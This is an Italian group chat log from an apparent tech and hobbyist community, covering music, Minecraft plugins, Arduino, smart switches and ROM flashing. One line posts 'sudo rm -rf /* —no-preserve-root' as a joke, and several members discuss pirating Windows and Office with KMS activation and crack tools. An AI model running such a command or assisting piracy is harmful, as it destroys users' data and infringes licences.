Io praticamente in ambito musicale sono ignorantissimo. Ascolto un solo genere, per quanto ampio, che a molti non piace (e comprendo il perché), ovvero la musica EDM
Certe perle però le apprezzo comunque
Nah i Who sono conosciuti
è uno dei miei gruppi preferiti
  toh, Ronnie James DIO  

Quello manca
in questi giorni lo metto su, promesso
e con questa perla vado a nanna 
Ero ironico 
Ma sei proprio vecchio 
Loro pure non li capisco... A volte fanno musica come questa qui, altre fanno merda
Oh
Vedi che ti banno se dici queste cose
Pensavo di meno onestamente
"la musica buona non invecchierà mai" - Bruce Springsteen
Il significato di quella è qualcosa di stupendo
Era riferito a te non alla musica 
lo so tieni conto che io spazio molto, dagli anni 50 in giù
Ma infatti ho detto l'esatto contrario. Quella canzone é bella, ma ne hanno fatte di penose e senza significato in passato
'70 in the heart
Panda ad ora tu
il mio gruppo preferito in assoluto sono i Queen, sono proprio un fan..poi il resto li seleziono e ascolto un pò di tutto (ascolto Bocelli e Maria Callas per dire, fino a Michael Jackson)
Ma seriamente in tutto sto bordello di musica
Nessuno ha nominato i Pink Floyd🤷‍♂
io li ho citati prima 
Mi pareva straaano
aspè, guarda che ti posto adesso
Anche Skrillex? 
quello devo ascoltarlo..ascolto Eminem però
Ti mando una canzone
trovatemi un altro che ha la locandina originale del Madison 1982 
 è bravo sul serio
Io adoro "First of the year" sua, ma in genere quasi tutte le sue vecchie canzoni mi piacciono
non lo conoscevo, è bravo 
Adesso secondo me è un po' calato, é diventato più commerciale, ma son gusti
 questa è IMMORTALE!!!! è seriamente da intenditori
e se vi dico Five Finger Death Punch?
 complimenti per i gursti musicali! Se facessi un canale sarei geramente felice, mi aiuterebbe a riscoprire gruppi old school che meritano 
domani oppure lunedì lo faccio, promesso
Oddio
Probabilmente lo seguirei anche io, anche se, ripeto, solitamente ascolto tutt'altro
I 5fdp hanno fatto diversi pezzi molto belli
si può sempre fare un gruppo, e ognuno posta quello che vuole..io non conosco mica tutta la musica del mondo 
Beh ci starebbe
"Bad Company" la sto ascoltando adesso..è stupenda

cioè, così, per dire  

Non avendo spotify devo andare di yt, ma per questa sera smetto di sprecare banda e quindi ripiego sui boston (forse) che li ho in locale
 li ADORO
Molto bella e abbastanza famosa 
Io propongo una cosa totalmente diversa e cioè "Children". Successone di tanti anni fa e capolavoro senza tempo, anche se l'autore é purtroppo passato a meglio e vita
vabbè i Lynird sono storici
I primi album sono fantastici
questa la conosco, ce l'ho sul cell 
Perché deve essere così orribile propagare le incertezze?
anche "Fable" è bellissima
È come vedere come si propagano gli errori nei conti. Terrificante
 visto che collezione?
Eh no è terrificante da fare i calcoli
Li facciamo in 3 e otteniamo 3 risultati diversi
Velocizzano, ma in ogni caso SEMPRE avrai che tre persone restano senza prodotto per ogni persona che lo ottiene
Già
questa è qualcosa di unico 

Già
Quanto avete spammato stasera con ste canzoni?
Tanto
1000 mex mimimo
300
si chiama cultura ❤️ addestro i ragazzi
Da mezzanotte e mezza
100 solo links
Cultura musicale, spam che non è spam
Cazzo
Sono anche stato quasi minacciato di ban 
È l'1.35
Moderatevi però, che poi la gente scappa 
Non me ne ero nemmeno accorto
Vogliamo vedere i log delle uscite
Vabbé é sabato sera, ci sta che si parli di musica
hai ragione..toh, ti lascio con questa perla assoluta e vado a letto 
  

casomai vedono la qualità dei membri e richiamano gente 

Johnny Cash è indiscutibile ragazzi
Attacco i boston e stacco internet, buona notte!
notte
Notte
Trovo un paio di canzoni per prendere sonno e vado anche io
Beati voi
 questa devi mettertela in loop quando usi Premiere  


nada sonno?
No il sonno c'è... Ma anche la relazione di laboratorio da fare
ahia..mi sa che fai alba
Notte guys
Mm no
Il tempo di tornare a casa, fare due conti e vado a nanna
povero Cicca
Che drone mi consigliate sulle 100€? Mi servirebbe un drone abbastanza stabile, con una lunga autonomia e una fotocamera discreta, la velocità non è una mia priorità.
Una fetta di culo? Che te ne fai della lunga portata?
Una fetta di culo?
È un modo di dire
Vuoi troppo per il budget...
Ovviamente per buono per quel Budget non voglio mica il 4K
Non è quello il punto. E poi, anche ti serve la portata, soprattutto a quel prezzo?
Scusa avevo sbagliato intendevo l’autonomia 
Perchè? Cosa ti serve 
 ?
Oltre i 12 minuti non vai
Mm ok
Comunque c'è il bugs e l'hubsan più o meno su quella cifra
Bah. Di nuovo trovi poco...
Pure usato funzionante
Sorteggio le risposte 
Ahahahh
ma perchè ultimamente sta andando down un sito al giorno?
Ci sono più cromosomi in giro 
2 Cellos 
è tornatoooo
Per qualche secondo mi sono interrogato sulla frase, poi è nato un istinto suicida

meno male, almeno la maggior parte della popolazione della Terra è sana
(questa frase può essere interpretata in molti modi)
+1

questa battuta è la 
 che abbia mai sentito ._.
Aaaw
pienamente d'accordo
Grande
I system sono mitici

ahahahahaha developer front-end con wordpress
io usavo Front Page 

Quoto
Anche You Owe Me
You Owe Me l'avrò ascoltata tipo 20 volte di fila un giorno
Ottime condizioni e elettrodi arrugginiti ma funzionanti, ieri mi sono divertito
imparare a saldare ad elettrodo e a gas (TiG-MIG) apre diverse porte lavorative
Ush, interessante 🤔
Ci farò un pensierino forse
un bravo saldatore TIG specializzato può arrivare a prendere anche 2000€ al mese 
non contando i lavori extra che può fare nel tempo libero

Ho decisamente sbagliato scuola
gli artigiani costano cari Gio..fabbri, saldatori, tornitori, fresatori guadagnano bene se sono bravi..un altro lavoro in cui si guadagna tantissimo è l'assistenza/ricambistica per pompe, autoclavi e motori a spazzole..i rifasatori sono richiestissimi
Azz
Bisogna patentarsi però
Anche di più
per non parlare dei marmisti e dei costruttori di porte e finestre in alluminio..li proprio si sale di livello
eh si, specialmente i TIG devono fare parecchi corsi
Per 2 secondi credevo fosse Ludovica
La mano am... ehmmm no...
... Enrico?
 acquisto effettuato, arrivati i soldi del referral?

mhh... perchè fai una ricerca su vasco rossi?
Stavo leggendo il fatto dell'arresto
ah
Eeeh mica si vedono subito
ahh...
babbè, spero di non aver sbagliato nulla
cos?
appunto?
arrestato vasco rossi?
ma acquistare da kinguin è sicuro?
Meglio di no
Droga

ARRESTATO PER DROGA VASCO ROSSI Il cantante aveva in casa ...


Gli arresti di Vasco - Forum Vasco Rossi[Modena Park 2017 ...
Ma nel '84
Lo so
Di cosa?
pc
Ok userò solo il suo referral
Correttore di n
M
la x370 gaming pro carbon è buona?
Effes
Ragazzi aiutoo
root@kali:~/Scrivania/ATNPybot-master# python 

  File "
", line 82
    response_altenen = requests.get("
" +str(thread),cookies=COOKIES).text
                                                                                                            ^
IndentationError: unindent does not match any outer indentation level
Non capisco l'errore
Devi indentare
Python è un bambino speciale
Quindi cosa dovrei fare?
Manda il codice
Okay

In pratica prende il testo di tutti i thread postati in un forum e me li invia su telegram
indentation error
benvenuto in python
Oh maronn
Non hai tolto il token comunque
L'ho cambiato con il mio
Comunque devi sistemare l’indentazione, se non sai cos’è vedi su google
Okay
Si chiama 
 il tuo bot?
yep
Elimina il messaggio con il codice, si vede il token
Ok
E rigeneralo da botfather
Il token era giusto?
Tempo fa usavo l'id
Mi ricorda la schermata di Winzoz 95/98
Si
E invece è il 7 pensa un po
Mai uscita con il 7 che tra l'altro reputo ancora una buona versione
Lo è
Lo hai sparafleshato🤣
Praticamente
Ho provato a formattare l'hard disk in tutte le maniere ma non ci sono mai riuscito
Ho scoperto che eWeLink aveva l'integrazione con ifttt
Oggi lo provo ad accendere e mi appare questo
Ma funziona correttamente il server? Lagga?
Nono
Funziona proprio bene
è in italiano????
Si
ifttt????!
Salve
alleluja
Ma cos'è?
ifttt
Allora i Sonoff sono da comprare
no, funzionano malissimo i loro server molto spesso sono off, consiglio di flashare tasmota e poi usarli con home assistant, che si puo anche intregrare con gassistant in ita, o con Switchando di 
Mah a me funziona bene
si fino a quando i server non vanno off, cosa che succede spesso
Io in 4-5 mesi che li posseggo sono andati off solo 3 volte
io ho tenuto per 1 settimana l'app e mi su 7 giorni per circa 2 giorni l'app non si collegava ai server perche off
Strano davvero
comunque consiglio lo stesso di flashare tasmota
Ma a cosa serve?
Tasmota non l'ho provato
ifttt ti permette di creare delle automazioni con vari servizi
fatto molto bene
Per automatizzare il tutto
Collega molte API di App Terze fra di loro, per eseguire azioni in Cloud automaticamente
Mh, ma funziona?
Certo
Ovvio
Leggevo che i Sonoff R2 non supportano il il flash.... è vero?
La proverò
Ad esempio ad una certa ora del giorno puoi mandare un Messaggio a qualcuno
quali sono?
È quello è una cosa anche basilare
Oppure puoi collegare instagram a Twitter a Facebook ecc
Ecco, sincronizzare i vari social
il dual intendi se si è supportato, credo che lo siano tutti
 qua la lista di tutti i dispositivi disponibili, non solo sonoff
Very Very Very grazie

Vivi in Molise ??
Qualcuno di voi ha una VPS su scaleway con la porta SMTP sbloccata?
Io
No
Giuseppe
Da quanto tempo
Ciaoo
Mi hanno appena tolto la limitazione
Dopo 1anno e mezzo
Fatti un proxy
Con una bella connessione
Compratene uno
Vedi che non te lo buttano giù
oppure vedi che ip ti sta dossando e gli blocchi la connessione
Ciao ragazzi 
Piccolo consiglio...
In fatto di sicurezza Hamachi com’è?? 

Perché sto mettendo appunto una rete vpn ma avrei bisogno di un qualcosa che funzionasse Out of the box...
Come diamine si usa?!
??
Lo ficchi nel buco del lettore cd
Cd?
Ma è un vinile
Lo metti sul giradisco
E il braccetto?
Lo metti al lato
Dal lato dovrebbe andare verso il centro
O il contrario
Io farò qualche casino
Ne sono certo
Da lato a centro
Scusate ma fa ifttt come arrivo ai sonoff
Che ne sto comprando uno per una cosa che dovrebbe essere molto sicura e accessibile solo da me (l'ho trovato a 3 euro) ma ancora non so bene come funzioni 
devi usare la loro app ewelink.  la cosa deve essere sicura in che senso? se deve funzionare sempre non direi di usare l'app perche ogni tanto succede che i server sono off e non puoi comandare i sonoff
ehm...
s'è corrotto l'MBR di Windows
L'occasione buona per passare a Linux
avvio il pc e parte Grub che cerca di avviare un Linux che non c'è
è quello che stavo cercando di fare 
eh sí ma c'è un piiiccolissimo problema
è un portatile con Windows preinstallato, ergo non ho il CD
sisi maa... non ho nessun altra cosa in giro per casa che abbia Windows sopra
l'unico disco con Windows in casa mia è il mio harddisk
ecco 
Scommetto che volevi installare Arch e hai visto il secondo video su YouTube
nono, stavo installando un normalissimo Deepin 
Ah ok 
deepin no
Una bella backdoor
volevo solo provarlo in realtà
why?
È closed source
E' cinese
E fin qua, vabe
Ma è cinese
Quindi bho
LOL
ma non possono neanche leggere i file di Windows, quindi 🤷‍♂
e comunque non l'ho installato, ho l'mbr rotto
Se devi solo provarlo fai pure
Io lo testai con arch ed è abbastanza stabile
 quelle punte sai che probabilmente sono di infima qualita
Hanno 3000 recensioni a 5 stelle
Io le ho prese, poi vediamo
sisi ma non credo siano molto affidabili
queste ad esempio sono gia delle buone punte e non costossime 
Pure io
Si ma costano 3€
Anzi meno
E si trovano anche su aliex a 1,82
lo so ma li vedo come 3 euro buttati probabilmente
Nah, tra tutte e 50 costano quanto una sola di quelle che hai linkato da amazon... anche se la qualità fosse 1/50 non sarebbero soldi buttati perché sarebbero qualità/prezzo uguali 
E dubito che la qualità sia 1/50... Se spingi in qualche modo immagino che bucheranno, viste le recensioni 
si ma le usi una volta fai 50 fori quelle ti durano una vita
le ho per questo lo dico
Nulla vieta di molarle e rifare il taglio
bhe ma non è una cosa da tutti devi anche avere gli strumenti
Certo, però per 2/3€ che costano si possono prendere
si pero non sono una bomba di qualita
Quotissimo
Le si acquista già con questa consapevolezza, sicuro
Cosa significa?
Mi sono trasferito in Toscana da tanto
Abitavo a sepino
xnxx? 
Ahahahahahahah
Le punte al cobalto sono molto ostiche e molto fragili, se non le si compra buone subito si rischia di buttare un sacco di soldi
queste sono ottime le ho io
Okay
Ahahahah ma che
Sto registrando Hacking
 bravo ragazzo
una bomba emp?
E non vi spoilero cosa sarà però è una bomba 
YouTube
Dafuq
Eh gia
Sarà una bomba in senso letterale?
E non vi spoilero cosa sarà però è una bomba 
Ciao ragazzi, conoscete qualche gruppo dedicato allo sviluppo server Minecraft?
Una bomba per il povero windows
Passiamo tutti a linux
Oh no ha joinato la jihad
> romboli96 joined 
!
Siiiii
Ahahahah questa è molto satirica
No....questa è la verità
Lo so ma è anche satirica
E non vi spoilero cosa sarà però è una bomba di tool 
 è il tool per rendere il rasp come il wifi pineapple?
nup
Azz deluso
Ho in canna anche quello, ma questo è più powwa
gruppi no, ma io sono stato (e da poco sono di nuovo) owner e dev di un server, perciò se ti serve qualcosa chiedi pure.
 
Volevo creare e magari vendere qualche plugin, ho abbastanza esperienza con la programmazione, ma sono totalmente nuovo al mondo Minecraft e plugin vari
minchia allora c'è gente che entra ora nella community
Mai giocato a Minecraft ahah
ah
Ho visto che c'è una sorta di engine, Bukkit
Non so altro
craftbukkit è morto il 6 settembre 2014
mi ricordo troppo bene quel giorno, tutti i server erano a rischio chiusura
Adesso cosa si usa?
Penso Spigot
adesso i più usati sono Spigot e Sponge, Spigot è un fork di Bukkit, Sponge è rifatto completamente da zero ed è molto più performante. Però usano tutti Spigot, perciò sei obbligato pure tu.
I plugin? Sempre in Java?
Per quanto riguarda Spigot, non c'è possibilità di scaricarlo in rete in maniera legale, l'unica è clonarti la repo, decompilare il jar della versione originale (vanilla) del server e aggiungerci Spigot API.
Questo perché è stato buttato giù per DMCA, però c'è un tool che te lo compila in automatico, lo apri e dopo mezz'ora ti da il jar di spigot.
sisi, Spigot è un fork di Bukkit (
)
Le spigot api sarebbero un pacchetto a parte?
ma cos 
spiega 🤔
per implementarle in un tuo plugin dici?
puoi anche mettere il jar di spigot come libreria, anzi, per certi plugin è d'obbligo visto che fornisce accesso anche alle classi di net.minecraft.server (del server vanilla ufficiale), basta che quando compili non includi la compilazione di Spigot, altrimenti ti viene una roba da 40MB
Bene bene, grazie, mentre se dovessi chiederti delle idee per un plugin? C'è qualcosa che gli utenti chiedono e che nessuno ha programmato?
Si uno 
 che non consenta di cambiare il nome originale ma solo il colore.Mi faresti anche un enorme favore visto che lo cerco da tempo xd
In molti casi ho dovuto trasformare il video del mercoledì in un videone principale (come quelli del sabato) 
 perché altrimenti non faremmo in tempo a far tutto 
 se fai 3 video alla settimana non ci arrabbiamo
Ahahah effettivamente
Eh...
☝️
quanto accidenti è vecchio quel messaggio? 
Sapevo che c'era ("che ci fosse"? 
), e sapevo cosa c'è scritto perché l'ho scritto io su Patreon 

È un cancelletto d'ingresso se non funziona quando devo entrare resto fuori casa 
E poi ho visto che "funziona con il wifi" ma emette una rete o buh cosa??
lui si collega alla tua wifi e deve avere la connesione a internet
3€ e affidabilità

se ci mette tasmota è affidabile
L'elettronica all'aperto?
?
È un cancello, non credo che il sonoff stia dentro casa.
gli metti una scatola ip67 è sei apposto
Considerando che inoltre si deve agganciare al WiFi io non lo vedo molto affidabile su un cancello di casa che non ha altre aperture
Qualcosa non quadra
io userei un elettro serratura che puo essere aperta anche da chiave cosa non c'è nessun problema in caso
Riuscite a dirmi se è giusto che dovrei mandarlo a fare su PCB... Ha zero crossing sync.. controllo termocoppia controllo ventola con transistor e controllo triac per controllo motore
Qualcuno che segue MotoGP?
Che cazzo ha fatto Marquez sta gara?
io
non lo so, non ho visto quella di stasera
Riguardatela appena puoi, così poi insulti Marquez insieme a me
devo prepararmi due calendari? uno lo faccio già fuori solo a pensarlo, senza vedere nulla
Se io faccio un account paypal collegato alla postepay, se qualcuno mi fa una donazione i soldi aumentano nella postepay?
a logica sì
Quello che ha fatto la direzione gara, cioè tutto tranne quello che andava fatto
Tre anni fa quando Marquez è caduto Vale è partito in ultima fila perdendo il campionato. Chi dimentica è complice
Si si
Ho ordinato le PCB da jlcpcb... Ma ho dimenticato di salvare il pcb prima di ordinare e non mi ero accorto che non aveva cambiato dei pad... Praticamente i pad del portafusibili che dovrebbe tenere una resistenza da 1kw sono rimasti da 60mil... Ma la pista che li circonda completamente è da 200 mil... La portata è da 200 o da 60 mil?
Cosí praticamente
Come si chiama quella canzone che fa join join join <bla bla> join join join era abbastanza veloce era diciamo "progressive"
La canta una voce femminile
Ma. Che. Cazzo.
Sihhhhh
Potrebbe essere un roblema

E se crasha il router si dorme per strada
Yee
si ma infatti secondo me dovresti avere un elttroserratura, tipo quelle che si usano con i citofoni che si possono apire sia con un impulso elettrico sia con la chiave 
Non vedo resistenze
Saranno LED 5V
Se li fai lampeggiare velocemente non succede nulla
Lo disse anche romboli nel TV b gne
Non ne ho messe 🤫🤦‍♂️
Da quanto dovrei metterla ?
Più o meno quelle da 330
Sono un valore inrtermedio che va bene con i 5V
Oppure te le calcoli
Ragazzi buongiorno mi servirebbe una dritta per un progetto Arduino
Vorrei realizzare un progetto che accenda un led con una variazione di flusso del campo magnetico ( ad esempio avvicinando o allontanando una calamita)
Sarebbe bello con arduino creare un telecomando per il pc
Tipo avviare YouTube, alzare/abbassare il volume,aprire Netflix e così via... così belli comodi si può gestire il pc
Io l'ho fatto
Come hai fatto in modo che pulsanti e potenziometri diventassero comandi per pc
Che linguaggio hai usato python ?
Ahhh vero non che avevo pensato
Ti serve un hall effect sensor
Un reed  non va bene?
Puoi anche verificare la polarità del magnete con un sensore del genere
Eh ma quello è solo on o off
Lui ha detto che vuole accendere un led in presenza di un campo magnetico, non avevo letto di esigenze particolari
Hai ragione, vediamo che ne pensa
Pensavo di essermi perso parte della chat ahah
Raga cliccateci sopra
In realtà devo fare un progettino per prendermi un voto...potrei stampare anche un pezzo 3d con la stampante... qualcosa che non porti via troppo tempo e magari legato all' ambito scolastico
I referral non sono ammessi, e inoltre quello non è il sito ufficiale di Epic Games. Elimino il messaggio e non warno solo perché non ho i permessi.
Chi è che devo warnare?
E chi si ricorda, uno che ha spammato un referral di Fortnite tra l'altro manco ufficiale
Vedi un po' tra i log dei messaggi eliminati se lo becchi
Si, lo vedo
Caddeto
Hai spammato referral
Capito tutto capo
E non hai neanche un username
Eh son povero
Scusa capo ma son povero, mi deve ancora arrivare la paga dal mio padrone. Questo mese non ho raccolto bene il cotone e mi picchia 
Per quanto fantasioso, non mi pare un buon motivo per spammare
E metti un username
Eh ma sennò il mio padrone mi picchia
Metti un username
Mi dispiace capo
 metti uno username
Sì gente lo so 
No capo
Metti un cazzo di username
Perché capo
Breve ma intenso
Finalmente
Ma hahaha
buongiorno
Su un ordine Banggood mi é comparso un bottone arancione che dice "Conferma la consegna", cos'è?
 sto compilando Spigot, sono incuriosito
Ma qualcuno ha preso il mouse a 40 centesimi da GearBest?
Non riesco ad ottenere o sconto
*Lo
Mi dicono adesso che sia solo per nuovi clienti ma non ne sono sicuro
Ma sono un nuovo cliente
Primo acquisto
Gli dici che è arrivata la roba, così loro migliorano le statistiche sui tempi di consegna
Scrive qualche errore?
Oook, devo effettivamente capire se é arrivato però 
Però poi in fase di pagamento mi fa pagare sempre 4 euro
C'è scritto sotto 0.50$ 🤔 che strano, che si sia buggato?
Prova ad aggiornare la pagina
Nada
Con buildtools.jar?
Perché lo scrive sotto: il coupon funziona... Però non viene applicato al prezzo 🤔 mai vista sta roba
Prova questo 
Ho fatto dall'app ed ha funzionato
Grazie mille
Ah boh ti ho solo detto quel che ho visto 
In realtà l'ho fatto a mano, essendo su ARCH ho seguito il pkgbuild del repo github
Ma mi sono accorto solo adesso di un problema, l'account ahah
Avete presente lo scheletro di cui parlavo ? È questo
Forse si ricorda...
cos'è sto vandalismo
cosa caaa
Ma ahahah
 c'è qualche trentino che riconosce la scuola? 
 
 

Si è la mia scuola
È il Galilei di Trento
Come no, è la mia scuola
Ex
Immagino per non creare scompiglio taggando user cambiandogli nome
 tu quale launcher usi?
Ma sapevamo che veniva, l'avevo anche invitato per un giro coi droni ma doveva scappare in Germania
Rip
E di cicca
lo sapevooooooooooooooooooooooooooo!!!! ci avrei scommesso!
Marco il video hacking domenica?
Ex
l'avevo immaginato
Quello ufficiale
ma se tu già a 14 anni eri al dipartimento di Fisica non hai mai fatto le superiori, lo sappiamo, sei troppo avanti

Hai un account majong?
io Microsoft Launcher e Nova
Intendevo Minecraft ragazzi 
Ovvio
È l'unico modo per giocare a Minecraft: Java Edition
Mentre per la Bedrock serve xbox live
ma non è vero. tu non hai mai avuto necessità di un insegnamento di così basso livello
In pratica bisogna sganciare 20 euro
25 da quando Mojang è stata acquisita da Microsoft
Per testare invece un server in locale? Posso usare qualche Launcher alternativo? Così evito di comprarlo adesso

 ‎So‎lo‎ €‎0.‎41
⭐️‎ 4‎.8‎4 ‌‎/‌‎ ‎5.‎00‎ (‎58‎6 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Gearbest
 

sbaglio o se ne metti due l'altro non te lo sconta?
Fai conto che il plugin lo devi fare a posta per funzionare sia per server che permettono l'accesso solo a chi ha comprato il gioco (tutti i server fatti bene) che per server che permettono l'accesso anche a chi l'ha craccato (tutti i server fatti male dove giocano i bambini), quindi per provare bene dovresti avere il gioco originale...
Bhe ma la possibilità di giocare con account crackato o no dipende dal server, non dal plugin, credo 🤔
Per adesso voglio solo vedere come funzionano le API, e cosa ci si può fare di carino
no rip :(
Sì ma un plugin che supporta solo i giocatori craccati funziona male con chi compra il gioco, appena cambi nome il plugin ti riconoscerebbe come un nuovo giocatore, mentre per i giocatori legit devi andare ad utilizzare l'UUID del giocatore, un identificato che viene dato dalla mojang e non cambia mai, nemmeno se cambi username.
Ah sì sì capisco
che infami quelli della microsoft
Per me il prezzo è giustificato invece
ma chi l'aveva pagato 20 euro?
Io
Tanti anni fa
funziona ancora?
Ah sì capisco, i plugin più utili invece sono a livello di gameplay o di sistema?
Certo
Anche chi lo aveva pagato 14€
Quando Minecraft è entrato nella Mojang è salito a 20€
In quel caso dovevi fare la migrazione dell'account dal vecchio sistema a quello nuovo, in maniera sempre gratuita
Comunque se vi interessasse: la Microsoft ha comprato Minecraft per 2,5 miliardi.
wow
ed è nato come un gioco di una singola persona
Soprattutto
Vecchie notizie, mi riportano ai tempi in cui anche io ci giocavo
Minecrafteroni
Era nato come progetto hobbistico di Markus Persson
hobby da 2 miliardi e mezzo
E si è rivelato un gioco piaciuto
Che lavoro faceva ai tempi Markus culosson?
Aka Notch, che dall'acquisizione da parte di Microsoft non lavora più a Minecraft ma ad altri progetti che non si caga nessuno facendo la bella vita.
ottimo
quindi l'hanno licenziato?
Se n'è andato direi
Oh se ti danno due miliardi continui a lavorare?
no
Appunto
shigni.. ehmemhemhem 
 
io 

inizialmente(l'alpha) era a 5€ 
E con la politica di markus persson(paghi una volta ed hai tutti gli updates) dovrebbe funzionare ancora
Sto su Linux 
Funziona comunque
È .jar
Ah è scritto in Java, bene
Tutto quello oc li ho visti in c++
esiste il jar
Bene mica tanto ahaha
tutto quello che riguarda mc di solito è scritto in java
visto che il gioco stesso lo è
siiii? 
satto
Sono d'accordo
Buondì, consigli su un micro pc x86 con almeno 4gb di ram che riesca a bootare da usb/disco esterno o che abbia almeno 256gb di spazio interno e che funzioni con Linux e che regga l'always on?
Anche se cercherò di implementare tutto con python
Cosa devi fare?
Plugin
Solitamente si fanno in Java, ma puoi riscriverti il server in Python
Oppure in Node.js
Bhe se dovessi riscriverlo lo farei in Golang
Ma non credo convenga
Credo sia possibile integrarlo in jython
Puoi farlo in qualsiasi linguaggio Backend
Probabile, anche se dovresti vedere come sono le performance
Yup, è vero
Sehh, riscrivere tutto il server spigot?? sarebbe solo quello il progetto
Lungo ma non impossibile
ma a quel punto fai solo quello e diventa quello il progetto 
Sarebbe rivoluzionario un server che offre Api rest per I plugin
Poi con la popolarità che otterresti facendo una roba del genere, sponsorizzi il server xD
In modo da supportare ogni linguaggio, anche in remoto
Figo, così volendo fai le richieste in localhost dal linguaggio che vuoi
Esattamente
 e intanto Casey ha spaccato l'ennesima reflex  
 guarda sto pazzo
raga c'è un modo per vedere il codice già presente in arduino?
No, o meglio non in codice C di Arduino ma in codice macchina

comunque per far funzionare la lib 'Keyboard.h'
come faccio per installarla?
Facendo una ricerca sull'acronimo REST, è spuntato in rosso questo xD
Dovrebbe essere già inclusa nell'ide
'Keyboard' non trovata. Il tuo sketch include la riga '
 <Keyboard.h>'?
Let me 
 that for you:
 

idem a me
Devi scrivere 

 "Keyboard.h"
fatto
Ma che Arduino stai usando?
funziona?
no, perche dovevo installarla prima dal file zip
ma non funziona cmq

Prova a selezionare come scheda Arduino/Genuino Micro
ma io uso arduino UNO
provo...
Allora non puoi farlo
funge OMG
come hai fatooooooooooooooo
aspe ma ma
Wuot, Arduino uno non supporta quella libreria
sta ancora caricando
a comunque romboli ha detto che si può cambiare il firmware di una usb e farla diventare: USB-Rubber-Ducky
si, ma servono usb strane
a non comuni?
e poi da quello che ho capito bisogna ricorrere all'hard modding
quindi saldare cose piccole
e io non ho la mano ferma quindi non ci penso proprio
 ricordi l'lcd?
cos???

raga qual'è la differenza fra
- 


- 

Io non ho nè un saldatore decente nè lo stagno con flux-core
Per la digispark ti serve una libreria apposta

Modena, Lavastoviglie e Lardo
Good
quindi cambiano tutti i code?
Yep
ma sono l'unico che quando era piccolo cambiava le texture di minecraft mettendo sotto il logo mojang il proprio nome per far credere agli amici (che non ne capivano niente di ste cose) di aver comprato la mojang
?
Ok forse questo non l'ho mai fatto
Sì
oooooooooooooooooooooooooooooooook
la verità ci ho provato una volta con riccardo mattia
alle case di mare
se i professori vi chiedono una parola composta
fbi = fb(facebook) + i(instagram)
triplo marck zuckemberg su ogni cosa
Jhon sric
satto
SENZA H
Dipende dal dispositivo usb
Lol
He can't see, there's quite large mask over his face



by 
vi è mai capitato che i professori vi spieghino l'esatto contrario di ciò che dice il libro?
No perché mi sto ritrovando degli appunti di letteratura che sono poco compatibili col libro
Mm in che senso? 
Si hahaha
Poi si apre un dibattito in classe
E dopo scoppia la guerra
nel senso spiega delle cose poco compatibili con quelle che spiega il libro
fato zenitale dal mio drone

firenze, villa romana
esiste una lista di librerie supportate dai diversi arduini

Eh tipo?
dice che nel Medioevo i numeri dispari hanno un'importanza divina... Sul libro mi dice che il numero più importante è il 10 che di dispari non so cos'ha
Eh ma vabbè mica sono in contraddizione
esperto java?
giusto per dirmi cosa sbaglio
Dipende da cosa devi fare
ha a che fare con linput con la grafica
oggi a scuola abbiamo cominciato la grafica,ma essendo troppo curioso voglio andare piu avanti e capire meglio come funziona
sicuramentre sul codice ho scritto delle cose orrende riguardante la grafica,per favore non uccidetemi
Il server non è difficile da settare
Ma che ci vuole a settare un server Minecraft?
Non ci avevo mai messo mano
Abituato a ben altri server mi aspettavo peggio
È così facile da essere banale
Si infatti, domani cercherò di cominciare a sviluppare qualche plugin simpatico
lol

 ‎So‎lo‎ €‎0.‎41
⭐️‎ 4‎.8‎4 ‌‎/‌‎ ‎5.‎00‎ (‎58‎6 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Gearbest
 

raga ancora nessuna ha risposto... se ne può prendere solo uno?
Io ne ho preso uno
io pure,  ne vorrei prendere un altro, ma non ci riesco
Pure io
Fai un altro account
mi risponde che il codice è scaduto 
Eh può essere
Spesso non durano molto
Che cosa rispondereste alla 61?
ma i coupon son limitati?
o infiniti?
50, c'è scritto
Infatti mi sa che sono finiti
Vado a impiccarmi
Con correnti intende ampere?

è arrivatooooooo!!!!!
pagato 120 euro
Uuuh il nuovo
siiii
regalo di mio padre
Si
Fiiigo
Perchè non capisco quella "media tensione" perchè tecnicamente da normativa per media tensione si intende da 1 a 35kv
ora devo installarci winzozz

stacca, staccaaaa, ci hanno tracciatiiiiii
Adesso cancello
sudo rm -rf /* —no-preserve-root
Già lo sapevo
is the way
A me è arrivato a metà gennaio ma non ho ancora trovato il tempo di metterlo
Perché il computer mi serve "operativo" e non posso metterlo a nanna

io lo installo e cracko quando mi arriva il pc
*i pezzi
dettagli mano

Linux' one is stored in 
no, only in /
kek
tu compri o crack winzozz? 
Io lo ho già
Devo metterlo nel portatile
uuk
io devo trovare un buon modo per craccarlo
rapido e indolore
Mmmmm

poi sull'ssd scarico la suite adobe e sull'hdd gta. cod, csgo e fortnite
e minecraft

Lo sanno tutti!
Io comunque la cancello sempre!!11!1!!1
Io uso antidetect
Ahahah
babbèè. inizio a flashare l'usb
qualcuno che l'ha già craccato?
cosa?
winzozzo
ah si
scrivimi in privato che ti mando un tool
per la crack?
yez
uuuk
Io ho usato KMS, sia per W10, che per la suite Office 2016.
e funziona?
Si, lo uso da quasi un anno e funziona, mai nessun problema.
ottimo
ma la procedura qual'è?
basta cliccare su activate?
una volta installato winzozzo?
Prima scarichi da Usb la versione di prova di Windows, poi la installi. Poi con KMS, lo attivi, premendo su Activate. Si attiva in meno di 1 minuto.

Ciao, esiste arch 64bit?
 ricordi del problema del ritardo che ho con i messaggi del Bot? Le parti sottolineate(del Bot overvolt) c'entrano qualcosa?
Perché dal sito ufficiale la ISO è x86_64, ma in live sul mio PC è buggatissima
Io non ho usato quelle funzioni  o il timeout preimpostato
Oddio... Ci sono vari modi per fare il bot stesso con telepot
Nell'errore che mi usciva c'erano problemi con il timeout effettivamente
C'è qualcuno che è capace ad usare notepad ++ per risolvere errore 7 durante l installazione di una rom?
Ehm non è proprio il massimo
Per cosa?
Perché devi prima capire il motivo per cui esce fuori
Che rom è innanzitutto?
E per che telefono?
Omnirom per Kenzo, la rom l ho scaricata giusta
È lo script di installazione
Ti dà un altro avviso prima?
Tipo "assert failed"?
No
(scritto in bianco)
Aspetta che controllo
E che rom hai ora?
Nitrogen
Mm ok... Se non ti compare nessun avviso della serie "assert failed"... Hai fatto wipe di tutto? Di 
, di 
 e delle cache?
si
Ok, allora bisogna controllare nell'updater script.... Ma sta' attento eh che rischi di brickare il telefono... Hai il root sulla nitrogen?
si
Controlla allora nel build.prop che nome c'è scritto tipo nella proprietà ro.product.device o ro.build.product
come faccio a vedere il build.prop?
Hai un file manager? Tipo FX
ma non ci credo mai
aspetta posso controllare da kernel adiutor
